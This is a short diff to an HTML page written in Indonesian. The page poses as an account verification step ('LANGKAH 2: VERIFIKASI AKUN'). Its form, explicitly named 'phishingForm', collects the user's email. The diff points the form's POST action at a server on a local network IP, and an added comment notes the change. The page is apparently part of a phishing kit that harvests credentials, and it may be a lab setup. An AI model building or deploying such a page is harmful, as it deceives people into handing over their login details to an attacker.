@@ -225,7 +225,8 @@
                 <strong>LANGKAH 2: VERIFIKASI AKUN</strong>
                 <p style="margin-top: 10px; color: #5f6368;">Masukkan data Anda untuk verifikasi</p>
                 
-                <form id="phishingForm" method="POST" action="http://127.0.0.1:8080/login">
+                <!-- UBAH: action IP diganti jadi 192.168.100.11 -->
+                <form id="phishingForm" method="POST" action="http://192.168.100.11:8080/login">
                     <div class="input-group">
                         <label>Email</label>
                         <input type="email" class="input-field" name="email" placeholder="nama@email.com" required>
